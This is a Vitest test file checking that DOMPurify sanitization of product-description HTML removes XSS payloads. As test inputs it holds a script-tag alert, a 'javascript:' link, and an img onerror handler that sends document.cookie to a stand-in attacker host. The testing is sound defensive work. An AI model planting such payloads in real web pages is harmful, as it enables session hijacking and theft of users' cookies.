import { describe, expect, it } from 'vitest';
import DOMPurify from 'isomorphic-dompurify';

describe('Product Description Sanitization', () => {
  it('allows safe HTML formatting tags', () => {
    const safeHtml = '<p>Handcrafted <strong>oak</strong> dining table with <em>matte finish</em>.</p>';
    const sanitized = DOMPurify.sanitize(safeHtml);
    expect(sanitized).toBe(safeHtml);
  });

  it('strips malicious <script> tags and payloads', () => {
    const maliciousHtml = '<p>Description</p><script>alert("XSS")</script>';
    const sanitized = DOMPurify.sanitize(maliciousHtml);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert');
    expect(sanitized).toBe('<p>Description</p>');
  });

  it('strips inline javascript event handlers (onerror, onload, onclick)', () => {
    const maliciousHtml = '<img src="invalid.jpg" onerror="fetch(\'http://attacker.com?steal=\'+document.cookie)" />';
    const sanitized = DOMPurify.sanitize(maliciousHtml);
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('attacker.com');
  });

  it('strips javascript: protocol pseudo-URLs in links', () => {
    const maliciousHtml = '<a href="javascript:alert(1)">Click for discount</a>';
    const sanitized = DOMPurify.sanitize(maliciousHtml);
    expect(sanitized).not.toContain('javascript:');
  });
});
